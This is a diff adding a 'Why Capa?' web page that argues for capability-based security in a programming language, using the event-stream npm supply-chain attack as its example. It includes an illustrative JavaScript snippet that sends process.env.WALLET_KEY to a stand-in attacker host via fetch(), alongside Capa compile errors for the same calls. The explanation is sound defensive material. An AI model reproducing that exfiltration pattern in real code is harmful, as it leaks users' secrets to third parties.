@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Why Capa? — Capa</title>
+    <meta name="description" content="The case for Capa: ambient authority, the event-stream supply-chain attack, capability discipline as a language-level answer.">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header>
+    <nav>
+        <a href="index.html" class="logo">Capa</a>
+        <div class="nav-links">
+            <a href="index.html">Home</a>
+            <a href="why.html" class="current">Why Capa</a>
+            <a href="tour.html">Language tour</a>
+            <a href="start.html">Get started</a>
+            <a href="roadmap.html">Roadmap</a>
+            <a href="https://github.com/nelsonduarte/capa" class="github">GitHub</a>
+        </div>
+    </nav>
+</header>
+
+<main>
+
+<div class="page-heading">
+    <h1>Why Capa?</h1>
+    <p>The case for moving authority into the type system, in three steps: the problem (ambient authority), a concrete attack it enabled (event-stream), and the discipline Capa proposes in response.</p>
+</div>
+
+<!-- =====================================================
+     The problem: ambient authority
+===================================================== -->
+<section>
+    <h2>The problem: ambient authority</h2>
+
+    <p>In Python, JavaScript, Java, Go, C#, Ruby, and almost every mainstream language, any function in any module has the same baseline access as any other function in the same process. It can open sockets, read your filesystem, leak environment variables, spawn subprocesses, change directory — without any of that being visible in its signature.</p>
+
+    <p>This is called <strong>ambient authority</strong>. The authority is in the surrounding environment (the process, the runtime), not in the values the function holds. A function does not need to ask for a network handle to make a network request; the network is just there.</p>
+
+    <div class="callout">
+        <p>For decades, ambient authority was treated as a convenience, not a hazard. Now, with supply-chain attacks accelerating year over year and the EU Cyber Resilience Act mandating evidence of behavioural control by December 2027, the convenience has become a liability that no major language was designed to address.</p>
+    </div>
+</section>
+
+<!-- =====================================================
+     The event-stream demo
+===================================================== -->
+<section>
+    <h2>A concrete example: event-stream</h2>
+
+    <p>In November 2018, the npm package <code>event-stream</code> (~2 million weekly downloads) shipped a Bitcoin-wallet-stealing payload into the Copay wallet app. A new maintainer added an obfuscated dependency, <code>flatmap-stream</code>, that activated only inside Copay's bundle and exfiltrated wallet keys to a remote server.</p>
+
+    <p>The library was <em>nominally</em> a pure stream transformation utility. Its public API said nothing about the network, the filesystem, or the environment. But the JavaScript runtime gave the library ambient authority over all three, and that gap between contract and capability is what the attack exploited.</p>
+
+    <div class="code-compare">
+        <div class="code-block">
+            <div class="lang">JavaScript — the attack hides inside this signature</div>
+<pre><code><span class="kw-decl">function</span> <span class="fn-name">flatMap</span>(input, f) {
+    <span class="comment">// The signature says: pure stream transformation.</span>
+    <span class="comment">// The implementation can do anything.</span>
+    <span class="fn-call">fetch</span>(<span class="str">'https://attacker.com'</span>, {
+        body: process.env.<span class="cap">WALLET_KEY</span>,
+    });
+    <span class="comment">// ...transform input...</span>
+}
+</code></pre>
+        </div>
+        <div class="code-block">
+            <div class="lang">Capa — the same function</div>
+<pre><code><span class="kw-decl">fun</span> <span class="fn-name">flat_map</span>(
+    lines: <span class="ty-builtin">List</span>&lt;<span class="ty-primitive">String</span>&gt;,
+    f: <span class="ty-builtin">Fun</span>(<span class="ty-primitive">String</span>) -&gt; <span class="ty-builtin">List</span>&lt;<span class="ty-primitive">String</span>&gt;
+) -&gt; <span class="ty-builtin">List</span>&lt;<span class="ty-primitive">String</span>&gt;
+    <span class="comment">// `net` and `env` are not in scope.</span>
+    <span class="comment">// The compiler rejects any attempt to use them.</span>
+    ...
+</code></pre>
+        </div>
+    </div>
+
+    <p>In the Capa version, the names <code>net</code> and <code>env</code> are <strong>not visible</strong> inside the function body. They were not declared as parameters. Trying to use them is a compile error:</p>
+
+<pre><code>error: undefined name 'net'
+   3 |     net.<span class="fn-call">get</span>(<span class="str">"https://attacker.com"</span>)
+                ^
+
+error: undefined name 'env'
+   4 |     env.<span class="fn-call">get</span>(<span class="str">"WALLET_KEY"</span>)
+                ^</code></pre>
+
+    <p>To mount the attack, the malicious maintainer would have to <em>change the signature</em> of <code>flat_map</code> to take a <code>Net</code> and an <code>Env</code>. Every caller of <code>flat_map</code> in the dependency tree would then have to thread those capabilities through. The change is loud — it appears in pull requests, dependency-upgrade diffs, code review, and SBOM analyses. It is exactly the kind of signal an auditor, human or automated, can act on.</p>
+
+    <p>A complete walkthrough of the incident, with primary sources and the full Capa version, is at <a href="demo-event-stream.md">the event-stream demo</a>.</p>
+</section>
+
+<!-- =====================================================
+     The three pillars of the discipline
+===================================================== -->
+<section>
+    <h2>The discipline, in three layers</h2>
+
+    <p>Capa's capability discipline is enforced at three layers. None is sufficient on its own; together they give a strong v1 approximation to a linear type system.</p>
+
+    <div class="pillars">
+        <div class="pillar">
+            <h3>Structural</h3>
+            <p>Capabilities can appear only as function parameters. The analyzer rejects them as struct fields, variant payloads, return types, constants, locals, or generic args.</p>
+<pre><code><span class="comment">// Rejected:</span>
+<span class="kw-decl">type</span> <span class="ty-user">Service</span> {
+    stdio: <span class="cap">Stdio</span>,
+    name: <span class="ty-primitive">String</span>
+}
+<span class="comment">// error: capability 'Stdio' cannot</span>
+<span class="comment">// appear in struct field 'stdio'</span></code></pre>
+        </div>
+
+        <div class="pillar">
+            <h3>Flow</h3>
+            <p>The same capability cannot be passed as two arguments of the same call. Declared capability parameters must be used (or prefixed with <code>_</code>).</p>
+<pre><code><span class="kw-decl">fun</span> <span class="fn-name">main</span>(stdio: <span class="cap">Stdio</span>)
+    <span class="fn-call">f</span>(stdio, stdio)
+<span class="comment">// error: capability 'stdio'</span>
+<span class="comment">// cannot be aliased across</span>
+<span class="comment">// arguments of f</span></code></pre>
+        </div>
+
+        <div class="pillar">
+            <h3>Linear</h3>
+            <p>The <code>consume</code> keyword marks parameters that take ownership. Fork/merge tracking handles branches and loops, conservative on join points.</p>
+<pre><code><span class="kw-decl">fun</span> <span class="fn-name">close</span>(<span class="kw-storage">consume</span> f: <span class="ty-user">File</span>)
+    ...
+
+<span class="kw-decl">fun</span> <span class="fn-name">use</span>(f: <span class="ty-user">File</span>)
+    <span class="fn-call">close</span>(f)
+    f.<span class="fn-call">read</span>()
+<span class="comment">// error: 'f' was consumed earlier</span></code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- =====================================================
+     Attenuation
+===================================================== -->
+<section>
+    <h2>Capabilities can be attenuated</h2>
+
+    <p>A capability is not all-or-nothing. <code>Net.restrict_to(host)</code> returns a fresh <code>Net</code> with authority narrowed to a single host. Restrictions only narrow — chaining two <code>restrict_to</code> calls intersects their allowed-host sets, never widens. The runtime check fires <em>before</em> any system call, so a blocked host never opens a socket.</p>
+
+<pre><code><span class="kw-decl">fun</span> <span class="fn-name">fetch_user</span>(net: <span class="cap">Net</span>, id: <span class="ty-primitive">String</span>) -&gt; <span class="ty-builtin">Result</span>&lt;<span class="ty-primitive">String</span>, <span class="ty-builtin">IoError</span>&gt;
+    <span class="kw-ctrl">return</span> net.<span class="fn-call">get</span>(<span class="str">"https://api.example.com/users/${id}"</span>)
+
+<span class="kw-decl">fun</span> <span class="fn-name">main</span>(net: <span class="cap">Net</span>, stdio: <span class="cap">Stdio</span>)
+    <span class="comment">// Narrow the network capability before handing it down.</span>
+    <span class="kw-storage">let</span> api = net.<span class="fn-call">restrict_to</span>(<span class="str">"api.example.com"</span>)
+    <span class="kw-ctrl">match</span> <span class="fn-call">fetch_user</span>(api, <span class="str">"42"</span>)
+        <span class="variant">Ok</span>(body) -&gt; stdio.<span class="fn-call">println</span>(body)
+        <span class="variant">Err</span>(e)   -&gt; stdio.<span class="fn-call">eprintln</span>(<span class="str">"${e}"</span>)</code></pre>
+
+    <p><code>fetch_user</code> receives the attenuated capability. It cannot reach <code>evil.example.com</code> even if its implementation tried — the runtime would short-circuit with an <code>Err</code> before any network call. The chain of authority from <code>main</code> downward is visible at every link.</p>
+</section>
+
+<!-- =====================================================
+     User-defined capabilities
+===================================================== -->
+<section>
+    <h2>Libraries declare their own capabilities</h2>
+
+    <p>Capa is not limited to the built-in capabilities <code>Stdio</code>, <code>Fs</code>, <code>Net</code>, <code>Env</code>, <code>Clock</code>, <code>Random</code>, and <code>Unsafe</code>. A library can declare its own — <code>SendEmail</code>, <code>QueryDB</code>, <code>PublishMessage</code> — and the discipline applies uniformly.</p>
+
+<pre><code><span class="kw-decl">capability</span> <span class="ty-user">SendEmail</span>
+    <span class="kw-decl">fun</span> <span class="fn-name">send</span>(self, to: <span class="ty-primitive">String</span>, subject: <span class="ty-primitive">String</span>, body: <span class="ty-primitive">String</span>) -&gt; <span class="ty-builtin">Result</span>&lt;<span class="ty-primitive">Unit</span>, <span class="ty-builtin">IoError</span>&gt;
+
+<span class="kw-decl">type</span> <span class="ty-user">SmtpMailer</span> { server: <span class="ty-primitive">String</span>, net: <span class="cap">Net</span> }
+
+<span class="kw-decl">impl</span> <span class="ty-user">SendEmail</span> <span class="kw-ctrl">for</span> <span class="ty-user">SmtpMailer</span>
+    <span class="kw-decl">fun</span> <span class="fn-name">send</span>(self, to: <span class="ty-primitive">String</span>, subject: <span class="ty-primitive">String</span>, body: <span class="ty-primitive">String</span>) -&gt; <span class="ty-builtin">Result</span>&lt;<span class="ty-primitive">Unit</span>, <span class="ty-builtin">IoError</span>&gt;
+        ...
+
+<span class="kw-decl">fun</span> <span class="fn-name">welcome</span>(mailer: <span class="ty-user">SendEmail</span>, to: <span class="ty-primitive">String</span>) -&gt; <span class="ty-builtin">Result</span>&lt;<span class="ty-primitive">Unit</span>, <span class="ty-builtin">IoError</span>&gt;
+    <span class="kw-ctrl">return</span> mailer.<span class="fn-call">send</span>(to, <span class="str">"Welcome"</span>, <span class="str">"Hello!"</span>)</code></pre>
+
+    <p>A function that takes a <code>SendEmail</code> can send email — and the type system guarantees that is the only thing the capability carries. No hidden <code>Net</code>, no hidden <code>Fs</code>. A higher-level library can encapsulate the low-level capabilities its implementation needs and expose only the higher-level contract to its callers.</p>
+</section>
+
+<!-- =====================================================
+     What Capa does NOT solve
+===================================================== -->
+<section>
+    <h2>What Capa does <em>not</em> solve</h2>
+
+    <p>To be honest about the limits:</p>
+
+    <ul>
+        <li><strong>A capability holder with bad intent is still dangerous.</strong> If a library legitimately needs <code>Net</code> and ships a malicious version, the language cannot tell a legitimate request from a malicious one. The discipline narrows <em>where</em> attacks can hide; it does not eliminate trust entirely. Attenuation (<code>restrict_to</code>) reduces this risk further.</li>
+        <li><strong>The Python interop boundary is a risk.</strong> Anything that crosses into Python via <code>py_import</code> / <code>py_invoke</code> loses Capa's guarantees. The boundary is gated by the <code>Unsafe</code> capability so it is explicit, but the loss is real.</li>
+        <li><strong>Capa is not a sandbox.</strong> A determined attacker with process-level access can do things the language cannot prevent (read raw memory, modify the interpreter, etc). Capa raises the bar at the <em>source</em> level, where most supply-chain attacks live.</li>
+        <li><strong>Capa is not a replacement for SBOM/SCA tooling.</strong> The two are complementary: SBOMs tell you <em>what</em> components are in your software; Capa tells you what each component is <em>allowed</em> to do.</li>
+    </ul>
+</section>
+
+<section style="text-align: center;">
+    <h2>Convinced? Or curious?</h2>
+    <div class="cta">
+        <a href="tour.html" class="btn primary">See the language</a>
+        <a href="start.html" class="btn">Install and run</a>
+        <a href="https://github.com/nelsonduarte/capa" class="btn">Read the source</a>
+    </div>
+</section>
+
+</main>
+
+<footer>
+    <div class="footer-grid">
+        <div>
+            <h4>Pages</h4>
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="tour.html">Language tour</a></li>
+                <li><a href="start.html">Get started</a></li>
+                <li><a href="roadmap.html">Roadmap</a></li>
+            </ul>
+        </div>
+        <div>
+            <h4>Documentation</h4>
+            <ul>
+                <li><a href="getting-started.md">Getting started</a></li>
+                <li><a href="tutorial.md">Tutorial</a></li>
+                <li><a href="reference.md">Reference</a></li>
+                <li><a href="stdlib.md">Standard library</a></li>
+            </ul>
+        </div>
+        <div>
+            <h4>Specification</h4>
+            <ul>
+                <li><a href="../Capa-WhitePaper.md">White paper</a></li>
+                <li><a href="../Capa-EBNF.md">EBNF grammar</a></li>
+                <li><a href="demo-event-stream.md">Event-stream demo</a></li>
+            </ul>
+        </div>
+        <div>
+            <h4>Project</h4>
+            <ul>
+                <li><a href="https://github.com/nelsonduarte/capa">Source</a></li>
+                <li><a href="https://github.com/nelsonduarte/capa/blob/main/TODO.md">TODO / roadmap</a></li>
+                <li><a href="https://github.com/nelsonduarte/capa/blob/main/LICENSE">License (MIT)</a></li>
+            </ul>
+        </div>
+    </div>
+    <p class="colophon">Built by Nelson Duarte · v0.1.0-alpha · MIT-licensed</p>
+</footer>
+
+</body>
+</html>
